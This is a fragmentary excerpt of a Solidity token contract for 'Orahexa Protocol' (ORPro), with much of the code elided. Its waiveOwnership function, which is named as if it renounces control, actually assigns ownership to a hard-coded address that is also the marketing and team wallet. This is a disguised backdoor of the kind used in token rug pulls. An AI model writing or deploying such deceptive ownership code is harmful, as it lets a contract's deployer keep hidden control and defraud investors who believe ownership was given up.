...
/**
Telegram : https://t.me/orahexaprotocol
Website : https://twitter.com/Orahexaprotocol
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x18192082c375A8B9d64809044cea840013c942De);
    }
...
contract ORAHEXAPROTOCOL is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Orahexa Protocol";
    string private _symbol = "ORPro";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x18192082c375A8B9d64809044cea840013c942De);
    address payable public teamWalletAddress = payable(0x18192082c375A8B9d64809044cea840013c942De);
